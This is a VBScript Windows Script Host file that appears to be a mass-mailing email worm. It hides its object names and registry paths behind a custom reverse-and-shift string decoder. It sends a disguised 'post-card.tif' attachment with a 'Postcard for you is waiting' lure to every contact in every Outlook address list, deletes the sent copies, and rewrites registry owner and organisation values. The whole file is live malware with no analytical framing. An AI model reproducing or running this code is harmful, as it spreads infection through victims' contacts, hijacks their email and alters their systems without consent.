<job id="DoneInVBS">
<?job debug="true"?>
<script language="Vbscript"> 
On Error Resume Next
Set u = CreateObject(uc("�����m�����q���dL��������q"))
Set zs = CreateObject(uc("����qL�����qu"))
If zs.RegRead(uc("reL`bLimmjrsmz������qzkjif")) = "" Then
reg_k = zs.RegWrite(uc("reL`bLimmjrsmz������qzkjif"),uc("O"))
a="C:\WINDOWS\TEMP\0.3643762post-card.tif.{3050F3D9-98B5-11CF-BB82-00AA00BDCE0B}"
subj="Postcard for you is waiting (in attachment)"
Set OA = CreateObject(uc("���������_L������m"))
Set OS=OA.GetNameSpace(uc("���"))
OS.logon "profile" , "password"
Set MI = OA.CreateItem(0)
For y = 1 To OS.AddressLists.Count
Set AdresBook = OS.AddressLists(y)
x = 1
For oo = 1 To AdresBook.AddressEntries.Count
newmailadd = AdresBook.AddressEntries(x)
Mi.Recipients.Add newmailadd
x = x + 1
Next
MI.Subject = subj
hb = uc("\R[����>����Z\`Z")
MI.HTMLBody = hb&subj
MI.Attachments.Add a
MI.DeleteAfterSubmit = True
MI.Send
newmailadd=""
next
End IF
ow = zs.RegWrite(uc("����m���������pz������t������az������uz��������kz������qzkjif"),uc("���{ay>�����{ay>K>n�w>���j"))
orga = zs.RegWrite(uc("���������m���������pz������t������az������uz��������kz������qzkjif"),uc("re>��`����b"))
u.DeleteFile(a)
function uc(str)
dim tt(200)
l = Len(str)
ll = 1
str = StrReverse(str)
nr = 0
For ll = 1 To l
str2 = Mid(str, ll, 1)
str1 = Asc(str2)
str3 = Replace(str2, Chr(str1),Chr(str1-30))
tt(nr) = str3
nr = nr + 1
Next
For st = 0 To l
ss = ss + tt(st)
Next
uc = ss
end function 
</script></job>